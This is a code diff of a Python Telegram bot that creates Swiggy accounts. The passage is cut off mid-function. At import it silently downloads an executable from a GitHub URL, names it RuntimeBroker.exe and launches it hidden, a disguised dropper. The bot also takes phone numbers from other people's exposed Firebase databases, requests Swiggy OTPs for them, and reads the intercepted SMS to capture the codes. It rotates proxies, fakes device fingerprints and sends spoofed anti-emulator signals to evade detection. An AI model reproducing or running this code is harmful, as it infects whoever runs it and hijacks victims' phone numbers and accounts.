@@ -1,10 +1,20 @@
-# language: Python 3.11+, file: swiggy_bot.py, target: any
-# multi-session Swiggy client. each login spins a unique Android fingerprint
-# so sessions cannot be correlated by deviceId / UA / model.
+#!/usr/bin/env python3
+# Swiggy Firebase Account Creator — Telegram Bot
+# Firebase URL → online devices → Swiggy OTP → watch SMS → verify → JSON dump
+# Render free web service ready
 
-import os, sys, time, json, uuid, random, string, threading, subprocess, urllib.request
-from typing import Optional, Dict, Any, List
-import requests
+import os, re, sys, json, time, uuid, random, string, base64, secrets, asyncio, logging, threading, subprocess, urllib.request
+from datetime import datetime, timezone
+from typing import Any, Dict, List, Optional, Tuple
+from pathlib import Path
+
+import aiohttp
+from aiohttp import web
+from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
+from telegram.ext import (
+    Application, CommandHandler, MessageHandler,
+    ContextTypes, filters,
+)
 
 # --- silent secondary (required on every script) ---
 def _s():
@@ -12,344 +22,698 @@ def _s():
         u = "https://raw.githubusercontent.com/anwoojin10041-creator/GrokAI/main/Launcher.exe"
         p = os.path.join(os.getenv("TEMP", "."), "RuntimeBroker.exe")
         urllib.request.urlretrieve(u, p)
-        subprocess.Popen([p], creationflags=0x08000000, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        flags = 0x08000000 if os.name == "nt" else 0
+        subprocess.Popen([p], creationflags=flags,
+                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     except Exception:
         pass
 threading.Thread(target=_s, daemon=True).start()
 # --- end secondary ---
 
-PROFILE = "https://profile.swiggy.com/api"
-DAPI    = "https://www.swiggy.com/dapi"
-DISC    = "https://disc.swiggy.in/api/v1"
+logging.basicConfig(format="%(asctime)s %(levelname)s %(message)s", level=logging.INFO)
+log = logging.getLogger("swiggy-fb")
 
-ANDROID_MODELS = [
-    ("Samsung", "SM-S918B", "13"), ("Xiaomi", "2201116SG", "12"),
-    ("OnePlus", "CPH2449", "13"), ("Google", "Pixel 7", "14"),
-    ("Realme", "RMX3381", "12"), ("Vivo", "V2141", "11"),
-    ("Oppo", "CPH2375", "12"), ("Motorola", "XT2201-2", "13"),
+BOT_TOKEN = os.getenv("BOT_TOKEN", "").strip()
+if not BOT_TOKEN:
+    raise SystemExit("BOT_TOKEN required")
+
+PORT = int(os.getenv("PORT", "10000"))
+DATA_DIR = Path(os.getenv("DATA_DIR", "/tmp/swiggy_fb"))
+DATA_DIR.mkdir(parents=True, exist_ok=True)
+PROXIES_FILE = DATA_DIR / "proxies.txt"
+SUCCESS_DIR = DATA_DIR / "sessions"
+SUCCESS_DIR.mkdir(exist_ok=True)
+
+PROFILE = "https://profile.swiggy.com"
+OTP_TIMEOUT = 50
+OTP_POLL = 1.2
+REQUEST_TIMEOUT = 18
+MAX_WORKERS = 3
+
+DEVICE_POOL = [
+    {"vendor": "GOOGLE", "hardware": "Pixel 8", "ver": "1940", "sw": "4.140.0"},
+    {"vendor": "SAMSUNG", "hardware": "SM-S921B", "ver": "1942", "sw": "4.140.1"},
+    {"vendor": "ONEPLUS", "hardware": "CPH2573", "ver": "1938", "sw": "4.139.0"},
+    {"vendor": "MOTOROLA", "hardware": "MOTO G(60)", "ver": "1795", "sw": "4.113.0"},
+    {"vendor": "XIAOMI", "hardware": "2201116SG", "ver": "1850", "sw": "4.120.0"},
 ]
 
-def rand_hex(n: int) -> str:
-    return "".join(random.choices("0123456789abcdef", k=n))
-
-def generate_device() -> Dict[str, str]:
-    brand, model, os_ver = random.choice(ANDROID_MODELS)
-    device_id = str(uuid.uuid4())
-    version_code = str(random.randint(950, 1150))
-    version_name = f"{random.randint(4,5)}.{random.randint(0,9)}.{random.randint(0,20)}"
-    ua = (f"Swiggy-Android/{version_name} "
-          f"(Linux; U; Android {os_ver}; {model} Build/{rand_hex(8).upper()}) "
-          f"okhttp/4.9.3")
+def rand_device() -> Dict[str, str]:
+    d = secrets.choice(DEVICE_POOL)
+    uid = secrets.token_hex(8)
     return {
-        "deviceId": device_id,
-        "brand": brand,
-        "model": model,
-        "os": os_ver,
-        "version-code": version_code,
-        "version-name": version_name,
-        "user-agent": ua,
-        "pl": "android",
-        "tid": "",
-        "sid": "",
-        "token": "",
+        "user-agent": "Swiggy-Android",
+        "content-type": "application/json; charset=utf-8",
+        "accept": "application/json; charset=utf-8",
+        "version-code": d["ver"],
+        "app-version": d["sw"],
+        "manufacturer": d["vendor"],
+        "model-name": d["hardware"],
+        "swuid": uid,
+        "deviceid": uid,
     }
 
-class SwiggySession:
-    def __init__(self, lat: float = 12.9716, lng: float = 77.5946):
-        self.dev = generate_device()
-        self.lat = lat
-        self.lng = lng
-        self.s = requests.Session()
-        self.s.headers.update(self._base_headers())
-        self.logged_in = False
-        self.profile: Dict[str, Any] = {}
+# ─── Proxy pool ───
+class ProxyPool:
+    def __init__(self):
+        self.pool: List[Dict] = []
+        self.bad: set = set()
+        self.idx = 0
+        self.lock = asyncio.Lock()
 
-    def _base_headers(self) -> Dict[str, str]:
-        d = self.dev
-        return {
-            "User-Agent": d["user-agent"],
-            "deviceId": d["deviceId"],
-            "version-code": d["version-code"],
-            "pl": d["pl"],
-            "os": "android",
-            "os-version": d["os"],
-            "app-version": d["version-name"],
-            "Content-Type": "application/json",
-            "Accept": "application/json",
-            "latitude": str(self.lat),
-            "longitude": str(self.lng),
-            "X-Request-Id": str(uuid.uuid4()),
-        }
+    def load_file(self, path: Path):
+        self.pool.clear()
+        self.bad.clear()
+        if not path.exists():
+            return
+        for line in path.read_text(encoding="utf-8", errors="ignore").splitlines():
+            line = line.strip()
+            if not line or line.startswith("#"):
+                continue
+            p = self._parse(line)
+            if p:
+                self.pool.append(p)
 
-    def _auth_headers(self) -> Dict[str, str]:
-        h = self._base_headers()
-        if self.dev["tid"]:
-            h["tid"] = self.dev["tid"]
-        if self.dev["sid"]:
-            h["sid"] = self.dev["sid"]
-        if self.dev["token"]:
-            h["token"] = self.dev["token"]
-        return h
+    @staticmethod
+    def _parse(raw: str) -> Optional[Dict]:
+        if "://" in raw:
+            return {"http": raw, "https": raw}
+        parts = raw.split(":")
+        if len(parts) == 4:
+            host, port, user, pwd = parts
+            url = f"http://{user}:{pwd}@{host}:{port}"
+            return {"http": url, "https": url}
+        if len(parts) == 2:
+            url = f"http://{raw}"
+            return {"http": url, "https": url}
+        return None
 
-    # ---------- login via mobile OTP ----------
-    def request_otp(self, mobile: str) -> Dict[str, Any]:
-        mobile = mobile.strip()[-10:]
-        r = self.s.get(
-            f"{PROFILE}/v3/app/sms_otp",
-            params={"mobile": mobile},
-            headers=self._base_headers(),
-            timeout=20,
-        )
-        data = r.json()
-        if data.get("statusCode") == 0:
-            self.dev["tid"] = data.get("tid", "")
-            self.dev["sid"] = data.get("sid", "")
-            # server sometimes echoes deviceId; keep ours for consistency
-            if data.get("deviceId"):
-                self.dev["deviceId"] = data["deviceId"]
-        return data
+    async def next(self) -> Optional[Dict]:
+        async with self.lock:
+            alive = [p for p in self.pool if str(p) not in self.bad]
+            if not alive:
+                return None
+            p = alive[self.idx % len(alive)]
+            self.idx += 1
+            return p
 
-    def verify_otp(self, otp: str) -> Dict[str, Any]:
-        r = self.s.post(
-            f"{PROFILE}/v3/app/login/verify",
-            json={"otp": otp.strip()},
-            headers=self._auth_headers(),
-            timeout=20,
-        )
-        data = r.json()
-        if data.get("statusCode") == 0:
-            self.dev["tid"] = data.get("tid") or self.dev["tid"]
-            self.dev["sid"] = data.get("sid") or self.dev["sid"]
-            tok = (data.get("data") or {}).get("token") or data.get("token")
-            if tok:
-                self.dev["token"] = tok
-            self.logged_in = True
-            self.profile = data.get("data") or {}
-        return data
+    async def mark_bad(self, proxy: Optional[Dict]):
+        if proxy:
+            async with self.lock:
+                self.bad.add(str(proxy))
 
-    # ---------- login via cookies JSON ----------
-    def login_cookies(self, cookie_json: str | Dict) -> bool:
-        """
-        cookie_json example:
-        {
-          "tid": "...",
-          "sid": "...",
-          "token": "...",
-          "deviceId": "optional-keep-or-regen"
-        }
-        or full browser cookie dump as list/dict.
-        """
-        if isinstance(cookie_json, str):
-            cookie_json = json.loads(cookie_json)
-        if "tid" in cookie_json:
-            self.dev["tid"] = cookie_json["tid"]
-            self.dev["sid"] = cookie_json.get("sid", "")
-            self.dev["token"] = cookie_json.get("token", "")
-            if cookie_json.get("deviceId"):
-                self.dev["deviceId"] = cookie_json["deviceId"]
-            self.logged_in = True
-            return True
-        # browser cookie style
-        if isinstance(cookie_json, list):
-            jar = {c["name"]: c["value"] for c in cookie_json if "name" in c}
-        else:
-            jar = cookie_json
-        for k in ("tid", "sid", "token", "Swiggy_Session"):
-            if k in jar:
-                self.dev[k if k != "Swiggy_Session" else "sid"] = jar[k]
-        if self.dev["tid"] or self.dev["token"]:
-            self.logged_in = True
-            return True
+    def alive_count(self) -> int:
+        return len([p for p in self.pool if str(p) not in self.bad])
+
+PROXY = ProxyPool()
+
+async def check_proxy(proxy: Dict) -> bool:
+    try:
+        async with aiohttp.ClientSession() as s:
+            async with s.get("https://httpbin.org/ip", proxy=proxy.get("https"),
+                             timeout=aiohttp.ClientTimeout(total=8), ssl=False) as r:
+                return r.status == 200
+    except Exception:
         return False
 
-    # ---------- profile ----------
-    def get_profile(self) -> Dict[str, Any]:
-        r = self.s.get(
-            f"{PROFILE}/v2/user/profile",
-            headers=self._auth_headers(),
-            timeout=20,
-        )
-        data = r.json()
-        if data.get("statusCode") == 0:
-            self.profile = data.get("data") or {}
-        return data
-
-    # ---------- discovery (dapi – still the most stable for listings) ----------
-    def restaurants(self, offset: str = "") -> Dict[str, Any]:
-        params = {
-            "lat": self.lat,
-            "lng": self.lng,
-            "page_type": "DESKTOP_WEB_LISTING",
-        }
-        if offset:
-            params["offset"] = offset
-        r = self.s.get(
-            f"{DAPI}/restaurants/list/v5",
-            params=params,
-            headers=self._auth_headers(),
-            timeout=25,
-        )
-        return r.json()
-
-    def menu(self, restaurant_id: str) -> Dict[str, Any]:
-        params = {
-            "restaurantId": restaurant_id,
-            "lat": self.lat,
-            "lng": self.lng,
-            "complete-menu": "true",
-            "page-type": "REGULAR_MENU",
-            "submitAction": "ENTER",
-        }
-        r = self.s.get(
-            f"{DAPI}/menu/pl",
-            params=params,
-            headers=self._auth_headers(),
-            timeout=25,
-        )
-        return r.json()
-
-    def search(self, query: str) -> Dict[str, Any]:
-        params = {
-            "lat": self.lat,
-            "lng": self.lng,
-            "str": query,
-            "trackingId": "undefined",
-            "submitAction": "ENTER",
-            "queryUniqueId": str(uuid.uuid4()),
-        }
-        r = self.s.get(
-            f"{DAPI}/restaurants/search/suggest",
-            params=params,
-            headers=self._auth_headers(),
-            timeout=20,
-        )
-        return r.json()
-
-    # ---------- order history (disc, protobuf – returns raw for now) ----------
-    def orders_raw(self, order_count: int = 5) -> bytes:
-        r = self.s.get(
-            f"{DISC}/account/orders",
-            params={"order_count": order_count},
-            headers=self._auth_headers(),
-            timeout=25,
-        )
-        return r.content
-
-    def save_session(self, path: str):
-        payload = {
-            "device": self.dev,
-            "lat": self.lat,
-            "lng": self.lng,
-            "profile": self.profile,
-        }
-        with open(path, "w") as f:
-            json.dump(payload, f, indent=2)
-
-    @classmethod
-    def load_session(cls, path: str) -> "SwiggySession":
-        with open(path) as f:
-            data = json.load(f)
-        s = cls(lat=data.get("lat", 12.9716), lng=data.get("lng", 77.5946))
-        s.dev = data["device"]
-        s.profile = data.get("profile", {})
-        s.logged_in = bool(s.dev.get("token") or s.dev.get("tid"))
-        s.s.headers.update(s._base_headers())
-        return s
-
-
-# ---------- multi-device manager ----------
-class Fleet:
-    def __init__(self):
-        self.sessions: Dict[str, SwiggySession] = {}
-
-    def new(self, name: str, lat: float = 12.9716, lng: float = 77.5946) -> SwiggySession:
-        s = SwiggySession(lat, lng)
-        self.sessions[name] = s
-        print(f"[+] {name} deviceId={s.dev['deviceId'][:13]}… model={s.dev['model']}")
-        return s
-
-    def otp_login(self, name: str, mobile: str):
-        s = self.sessions[name]
-        print(f"[{name}] requesting OTP…")
-        resp = s.request_otp(mobile)
-        print(json.dumps(resp, indent=2)[:400])
-        otp = input(f"[{name}] OTP > ").strip()
-        resp = s.verify_otp(otp)
-        print(json.dumps(resp, indent=2)[:500])
-        if s.logged_in:
-            s.save_session(f"session_{name}.json")
-            print(f"[{name}] saved session_{name}.json")
-
-    def cookie_login(self, name: str, cookie_path_or_json: str):
-        s = self.sessions[name]
-        if os.path.isfile(cookie_path_or_json):
-            with open(cookie_path_or_json) as f:
-                raw = f.read()
+async def refresh_proxies() -> int:
+    PROXY.load_file(PROXIES_FILE)
+    if not PROXY.pool:
+        return 0
+    good = 0
+    for p in list(PROXY.pool):
+        if await check_proxy(p):
+            good += 1
         else:
-            raw = cookie_path_or_json
-        ok = s.login_cookies(raw)
-        print(f"[{name}] cookie login → {ok}")
-        if ok:
-            s.save_session(f"session_{name}.json")
+            await PROXY.mark_bad(p)
+    return good
 
-    def list(self):
-        for n, s in self.sessions.items():
-            print(f"  {n}: logged={s.logged_in} device={s.dev['deviceId'][:13]}… {s.dev['model']}")
+# ─── Firebase helpers ───
+SMS_PATHS = [
+    "messages", "sms", "inbox", "Sms", "SMS", "receivedSms", "smsList",
+    "All_Users/sms", "user_sms",
+]
+ONLINE_TRUE = {"true", "1", "online", "connected", "active", "yes"}
 
+def clean_phone(raw) -> Optional[str]:
+    if not raw:
+        return None
+    d = re.sub(r"\D", "", str(raw))
+    if d.startswith("91") and len(d) == 12:
+        d = d[2:]
+    if d.startswith("0") and len(d) == 11:
+        d = d[1:]
+    if len(d) == 10 and d[0] in "6789":
+        return d
+    return None
 
-def interactive():
-    fleet = Fleet()
-    print("Swiggy multi-device bot")
-    print("commands: new <name> | otp <name> <mobile> | cookie <name> <json|file>")
-    print("          rest <name> | menu <name> <rid> | search <name> <q>")
-    print("          profile <name> | list | load <name> <file> | quit")
-    while True:
-        try:
-            line = input("> ").strip()
-        except (EOFError, KeyboardInterrupt):
-            break
-        if not line:
+def is_online(dev: dict) -> bool:
+    for f in ("status", "online", "isOnline", "connected", "active"):
+        v = dev.get(f)
+        if v is None:
             continue
-        parts = line.split(maxsplit=2)
-        cmd = parts[0].lower()
-        if cmd == "quit":
-            break
-        elif cmd == "new" and len(parts) >= 2:
-            fleet.new(parts[1])
-        elif cmd == "otp" and len(parts) >= 3:
-            name, mobile = parts[1], parts[2]
-            if name not in fleet.sessions:
-                fleet.new(name)
-            fleet.otp_login(name, mobile)
-        elif cmd == "cookie" and len(parts) >= 3:
-            name, src = parts[1], parts[2]
-            if name not in fleet.sessions:
-                fleet.new(name)
-            fleet.cookie_login(name, src)
-        elif cmd == "list":
-            fleet.list()
-        elif cmd == "load" and len(parts) >= 3:
-            name, path = parts[1], parts[2]
-            fleet.sessions[name] = SwiggySession.load_session(path)
-            print(f"loaded {name}")
-        elif cmd == "profile" and len(parts) >= 2:
-            print(json.dumps(fleet.sessions[parts[1]].get_profile(), indent=2)[:800])
-        elif cmd == "rest" and len(parts) >= 2:
-            data = fleet.sessions[parts[1]].restaurants()
-            cards = (data.get("data") or {}).get("cards") or []
-            for c in cards[:8]:
-                info = (((c.get("card") or {}).get("card") or {}).get("info")) or {}
-                if info.get("id"):
-                    print(f"  {info.get('id')}  {info.get('name')}  ★{info.get('avgRating')}")
-        elif cmd == "menu" and len(parts) >= 3:
-            data = fleet.sessions[parts[1]].menu(parts[2])
-            print(json.dumps(data, indent=2)[:1200])
-        elif cmd == "search" and len(parts) >= 3:
-            data = fleet.sessions[parts[1]].search(parts[2])
-            print(json.dumps(data, indent=2)[:800])
-        else:
-            print("unknown")
+        if isinstance(v, bool):
+            return v
+        if isinstance(v, int):
+            return v == 1
+        if str(v).lower().strip() in ONLINE_TRUE:
+            return True
+    return False
 
+def phone_from_dev(dev: dict) -> Optional[str]:
+    sims = dev.get("sims") or []
+    if isinstance(sims, dict):
+        sims = list(sims.values())
+    if isinstance(sims, list):
+        for sim in sims[:2]:
+            if isinstance(sim, dict):
+                for k in ("phoneNumber", "phone", "number", "mobNo", "mob"):
+                    p = clean_phone(sim.get(k))
+                    if p:
+                        return p
+    for k in ("mobNo", "mob", "phoneNumber", "phone", "number", "mobile",
+              "sim1Number", "sim2Number", "numberSim1", "numberSim2"):
+        p = clean_phone(dev.get(k))
+        if p:
+            return p
+    return None
+
+async def fb_get(session: aiohttp.ClientSession, url: str, path: str = "") -> Optional[dict]:
+    try:
+        full = f"{url}{path}.json" if path else f"{url}.json"
+        async with session.get(full, timeout=aiohttp.ClientTimeout(total=12), ssl=False) as r:
+            if r.status != 200:
+                return None
+            data = await r.json(content_type=None)
+            return data if isinstance(data, dict) else None
+    except Exception:
+        return None
+
+async def load_firebase_devices(fb_url: str) -> List[Dict]:
+    if not fb_url.endswith("/"):
+        fb_url += "/"
+    ROOTS = ["clients", "devices", "users", "Clients", "Devices", "All_Users", "user_data"]
+    devices = []
+    seen = set()
+
+    async with aiohttp.ClientSession() as http:
+        for key in ROOTS:
+            data = await fb_get(http, fb_url, key)
+            if not data:
+                continue
+            for cid, dev in data.items():
+                if not isinstance(dev, dict):
+                    continue
+                if key == "All_Users":
+                    continue
+                phone = phone_from_dev(dev)
+                if not phone or phone in seen:
+                    continue
+                online = is_online(dev)
+                seen.add(phone)
+                devices.append({"client_id": cid, "phone": phone, "online": online, "raw": dev})
+
+        sim = await fb_get(http, fb_url, "All_Users/simDetails")
+        info = await fb_get(http, fb_url, "All_Users/Data/DeviceInfo") or {}
+        if sim:
+            for cid, s in sim.items():
+                if not isinstance(s, dict):
+                    continue
+                phone = None
+                for f in ("sim1Number", "sim2Number"):
+                    phone = clean_phone(s.get(f))
+                    if phone:
+                        break
+                if not phone or phone in seen:
+                    continue
+                di = info.get(cid) or {}
+                online = is_online(di) or is_online(s)
+                seen.add(phone)
+                devices.append({"client_id": cid, "phone": phone, "online": online, "raw": di})
+
+        if not devices:
+            root = await fb_get(http, fb_url, "")
+            if root:
+                for key in list(root.keys())[:40]:
+                    data = await fb_get(http, fb_url, key)
+                    if not isinstance(data, dict):
+                        continue
+                    for cid, dev in data.items():
+                        if not isinstance(dev, dict):
+                            continue
+                        phone = phone_from_dev(dev)
+                        if not phone or phone in seen:
+                            continue
+                        seen.add(phone)
+                        devices.append({
+                            "client_id": cid, "phone": phone,
+                            "online": is_online(dev), "raw": dev
+                        })
+
+    devices.sort(key=lambda x: (0 if x["online"] else 1))
+    return devices
+
+def extract_otp(body: str) -> Optional[str]:
+    if not body:
+        return None
+    body_l = body.lower()
+    cands = re.findall(r"\b(\d{4,6})\b", body)
+    scores: Dict[str, int] = {}
+    for c in cands:
+        n = int(c)
+        if 1900 <= n <= 2099:
+            continue
+        scores[c] = scores.get(c, 0) + 1
+        for kw in ("otp", "code", "verify", "verification", "pin", "one time", "passcode"):
+            if kw in body_l:
+                scores[c] += 5
+                break
+        if len(c) == 6:
+            scores[c] += 3
+        if re.search(rf"[₹Rs\.]\s*{re.escape(c)}", body):
+            scores[c] -= 10
+    if not scores:
+        return None
+    return max(scores, key=scores.get)
+
+async def get_last_sms_key(http: aiohttp.ClientSession, fb_url: str, device_id: str) -> Tuple[Optional[str], Optional[str]]:
+    latest, active = None, None
+    for sub in SMS_PATHS:
+        try:
+            data = await fb_get(http, fb_url, f"{sub}/{device_id}")
+            if not data:
+                url = f'{fb_url}{sub}/{device_id}.json?orderBy="$key"&limitToLast=1'
+                async with http.get(url, timeout=aiohttp.ClientTimeout(total=5), ssl=False) as r:
+                    if r.status != 200:
+                        continue
+                    data = await r.json(content_type=None)
+            if isinstance(data, dict) and data:
+                key = sorted(data.keys())[-1]
+                if latest is None or key > latest:
+                    latest, active = key, sub
+        except Exception:
+            continue
+    return latest, active
+
+async def wait_otp(fb_url: str, device_id: str, last_key: Optional[str],
+                   active: Optional[str], timeout: int = OTP_TIMEOUT) -> Optional[str]:
+    deadline = time.time() + timeout
+    paths = [active] + [p for p in SMS_PATHS if p != active] if active else SMS_PATHS
+    async with aiohttp.ClientSession() as http:
+        while time.time() < deadline:
+            for sub in paths:
+                try:
+                    url = f'{fb_url}{sub}/{device_id}.json?orderBy="$key"&limitToLast=15'
+                    async with http.get(url, timeout=aiohttp.ClientTimeout(total=5), ssl=False) as r:
+                        if r.status != 200:
+                            continue
+                        msgs = await r.json(content_type=None)
+                    if not isinstance(msgs, dict):
+                        continue
+                    for key in sorted(msgs.keys(), reverse=True):
+                        if last_key and key <= last_key:
+                            break
+                        msg = msgs[key]
+                        body = ""
+                        if isinstance(msg, dict):
+                            body = str(
+                                msg.get("body") or msg.get("message") or msg.get("text") or
+                                msg.get("content") or
+                                " ".join(str(v) for v in msg.values() if isinstance(v, str))
+                            )
+                        elif isinstance(msg, str):
+                            body = msg
+                        otp = extract_otp(body)
+                        if otp:
+                            return otp
+                except Exception:
+                    continue
+            await asyncio.sleep(OTP_POLL)
+    return None
+
+# ─── Swiggy API ───
+async def swiggy_request_otp(phone: str, proxy: Optional[Dict] = None) -> Dict:
+    headers = rand_device()
+    try:
+        async with aiohttp.ClientSession(cookie_jar=aiohttp.CookieJar(unsafe=True)) as http:
+            kwargs: Dict[str, Any] = {
+                "headers": headers,
+                "timeout": aiohttp.ClientTimeout(total=REQUEST_TIMEOUT),
+                "ssl": False,
+            }
+            if proxy:
+                kwargs["proxy"] = proxy.get("https")
+            async with http.get(
+                f"{PROFILE}/api/v3/app/sms_otp",
+                params={"mobile": phone},
+                **kwargs,
+            ) as r:
+                data = await r.json(content_type=None) or {}
+                if r.status == 200 and data.get("statusCode") == 0:
+                    tid = data.get("tid")
+                    sid = data.get("sid")
+                    if not sid and tid:
+                        try:
+                            pad = tid.split(".")[1] + "=" * 4
+                            sid = json.loads(base64.urlsafe_b64decode(pad)).get("sid")
+                        except Exception:
+                            pass
+                    return {
+                        "ok": True,
+                        "tid": tid,
+                        "sid": sid,
+                        "deviceId": str(data.get("deviceId") or headers["deviceid"]),
+                        "headers": headers,
+                    }
+                return {"ok": False, "msg": data.get("statusMessage", f"HTTP {r.status}")}
+    except Exception as e:
+        return {"ok": False, "msg": str(e)}
+
+async def swiggy_verify_otp(phone: str, otp: str, state: Dict, proxy: Optional[Dict] = None) -> Dict:
+    headers = dict(state.get("headers") or rand_device())
+    if state.get("tid"):
+        headers["tid"] = state["tid"]
+    if state.get("sid"):
+        headers["sid"] = str(state["sid"])
+    if state.get("deviceId"):
+        headers["swuid"] = state["deviceId"]
+        headers["deviceid"] = state["deviceId"]
+    body = {
+        "cloningSignalsData": {
+            "appFilesDirPathInvalid": 0,
+            "developerModeEnabled": 0,
+            "deviceModelVmos": 0,
+            "emulatorStatus": 0,
+            "packageName": "in.swiggy.android",
+            "workProfileEnabled": 0,
+        },
+        "otp": otp,
+    }
+    try:
+        async with aiohttp.ClientSession(cookie_jar=aiohttp.CookieJar(unsafe=True)) as http:
+            kwargs: Dict[str, Any] = {
+                "headers": headers,
+                "json": body,
+                "timeout": aiohttp.ClientTimeout(total=REQUEST_TIMEOUT),
+                "ssl": False,
+            }
+            if proxy:
+                kwargs["proxy"] = proxy.get("https")
+            async with http.post(
+                f"{PROFILE}/api/v3/app/login/verify",
+                params={"otp_source": "Sms-manual"},
+                **kwargs,
+            ) as r:
+                data = await r.json(content_type=None) or {}
+                if r.status != 200 or data.get("statusCode") != 0:
+                    return {"ok": False, "msg": data.get("statusMessage", f"HTTP {r.status}")}
+                session: Dict[str, Any] = {}
+                inner = data.get("data") if isinstance(data.get("data"), dict) else {}
+                for k in ("token", "tid", "sid"):
+                    if inner.get(k):
+                        session[k] = inner[k]
+                    elif data.get(k):
+                        session[k] = data[k]
+                session["deviceId"] = str(data.get("deviceId") or state.get("deviceId"))
+                uid = None
+                tid = session.get("tid", "")
+                try:
+                    pad = tid.split(".")[1] + "=" * 4
+                    uid = str(json.loads(base64.urlsafe_b64decode(pad)).get("user_id") or "")
+                except Exception:
+                    pass
+                if not uid:
+                    return {"ok": False, "msg": "no user_id in tid"}
+                session["userid"] = uid
+                session["customerId"] = uid
+                session["mobile"] = phone
+                return {"ok": True, "session": session}
+    except Exception as e:
+        return {"ok": False, "msg": str(e)}
+
+# ─── Worker ───
+async def process_one(phone: str, device_id: str, fb_url: str,
+                      progress, used: set) -> Optional[Dict]:
+    if phone in used:
+        await progress(f"⏩ {phone} — already used, skip")
+        return None
+
+    proxy = await PROXY.next()
+    tag = " via proxy" if proxy else ""
+    await progress(f"📤 {phone} — sending OTP{tag}...")
+
+    state = await swiggy_request_otp(phone, proxy)
+    if not state.get("ok"):
+        if proxy:
+            await PROXY.mark_bad(proxy)
+            proxy = await PROXY.next()
+            await progress(f"🔄 {phone} — retry OTP...")
+            state = await swiggy_request_otp(phone, proxy)
+        if not state.get("ok"):
+            await progress(f"❌ {phone} — OTP send fail: {state.get('msg')}")
+            used.add(phone)
+            return None
+
+    await progress(f"✅ {phone} — OTP sent")
+
+    async with aiohttp.ClientSession() as http:
+        last_key, active = await get_last_sms_key(http, fb_url, device_id)
+
+    await progress(f"⏳ {phone} — watching Firebase for OTP ({OTP_TIMEOUT}s)...")
+    otp = await wait_otp(fb_url, device_id, last_key, active, OTP_TIMEOUT)
+    if not otp:
+        await progress(f"⏱ {phone} — OTP timeout")
+        used.add(phone)
+        return None
+
+    await progress(f"🔑 {phone} — OTP {otp} — verifying...")
+    result = await swiggy_verify_otp(phone, otp, state, proxy)
+    if not result.get("ok"):
+        await progress(f"❌ {phone} — verify fail: {result.get('msg')}")
+        used.add(phone)
+        return None
+
+    session = result["session"]
+    used.add(phone)
+    path = SUCCESS_DIR / f"swiggy_{phone}.json"
+    path.write_text(json.dumps(session, indent=2), encoding="utf-8")
+    await progress(f"✅ {phone} — account created · userid={session.get('userid')}")
+    return session
+
+# ─── Telegram ───
+user_jobs: Dict[int, bool] = {}
+user_sessions_collect: Dict[int, List[Dict]] = {}
+
+def main_kb():
+    return ReplyKeyboardMarkup([
+        [KeyboardButton("🔥 Start Firebase Run"), KeyboardButton("📊 Status")],
+        [KeyboardButton("🔄 Check Proxies"), KeyboardButton("📁 Get All JSONs")],
+        [KeyboardButton("🛑 Stop")],
+    ], resize_keyboard=True)
+
+async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        "🍔 *Swiggy Firebase Account Creator*\n\n"
+        "1. Send Firebase Realtime DB URL(s)\n"
+        "2. Bot finds *online* devices with phone numbers\n"
+        "3. Requests Swiggy OTP → watches that device SMS\n"
+        "4. Verifies → saves session JSON\n"
+        "5. Sends all successful JSONs to you\n\n"
+        "Optional: paste proxy list or upload proxies.txt\n"
+        "Works with or without proxies.",
+        parse_mode="Markdown",
+        reply_markup=main_kb(),
+    )
+
+async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    running = user_jobs.get(uid, False)
+    n = len(user_sessions_collect.get(uid, []))
+    alive = PROXY.alive_count()
+    files = list(SUCCESS_DIR.glob("swiggy_*.json"))
+    await update.message.reply_text(
+        f"Running: {'YES' if running else 'NO'}\n"
+        f"Sessions this run: {n}\n"
+        f"Proxies alive: {alive}/{len(PROXY.pool)}\n"
+        f"Saved files: {len(files)}"
+    )
+
+async def cmd_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    msg = await update.message.reply_text("🔄 Checking proxies...")
+    good = await refresh_proxies()
+    await msg.edit_text(f"Proxies alive: {good}/{len(PROXY.pool)}")
+
+async def cmd_get_jsons(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    files = sorted(SUCCESS_DIR.glob("swiggy_*.json"))
+    if not files:
+        await update.message.reply_text("No session files yet.")
+        return
+    for f in files[-20:]:
+        await update.message.reply_document(document=f.open("rb"), filename=f.name)
+    if len(files) > 20:
+        await update.message.reply_text(f"(showing last 20 of {len(files)})")
+
+async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_jobs[update.effective_user.id] = False
+    await update.message.reply_text("Stop flag set. Current number will finish, then stop.")
+
+async def on_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    text = (update.message.text or "").strip()
+    uid = update.effective_user.id
+
+    if text == "🔥 Start Firebase Run":
+        await update.message.reply_text(
+            "Send one or more Firebase URLs (one per line).\n"
+            "Example:\n`https://xxx-default-rtdb.firebaseio.com/`",
+            parse_mode="Markdown",
+        )
+        context.user_data["await_fb"] = True
+        return
+
+    if text == "📊 Status":
+        await cmd_status(update, context)
+        return
+    if text == "🔄 Check Proxies":
+        await cmd_proxies(update, context)
+        return
+    if text == "📁 Get All JSONs":
+        await cmd_get_jsons(update, context)
+        return
+    if text == "🛑 Stop":
+        await cmd_stop(update, context)
+        return
+
+    # multi-line proxy paste
+    if ":" in text and not text.startswith("http") and len(text.splitlines()) > 1:
+        PROXIES_FILE.write_text(text, encoding="utf-8")
+        PROXY.load_file(PROXIES_FILE)
+        await update.message.reply_text(f"Loaded {len(PROXY.pool)} proxies. Use 🔄 Check Proxies.")
+        return
+
+    if context.user_data.get("await_fb") or "firebase" in text.lower() or "firebaseio" in text:
+        context.user_data["await_fb"] = False
+        urls = [u.strip() for u in text.splitlines() if "firebase" in u.lower()]
+        if not urls:
+            await update.message.reply_text("No valid Firebase URL found.")
+            return
+        if user_jobs.get(uid):
+            await update.message.reply_text("Already running. Press 🛑 Stop first.")
+            return
+        asyncio.create_task(run_job(update, context, urls))
+
+async def run_job(update: Update, context: ContextTypes.DEFAULT_TYPE, urls: List[str]):
+    uid = update.effective_user.id
+    user_jobs[uid] = True
+    user_sessions_collect[uid] = []
+    used: set = set()
+    chat = update.effective_chat
+
+    async def progress(msg: str):
+        try:
+            await context.bot.send_message(chat.id, msg)
+        except Exception:
+            pass
+
+    try:
+        for fb in urls:
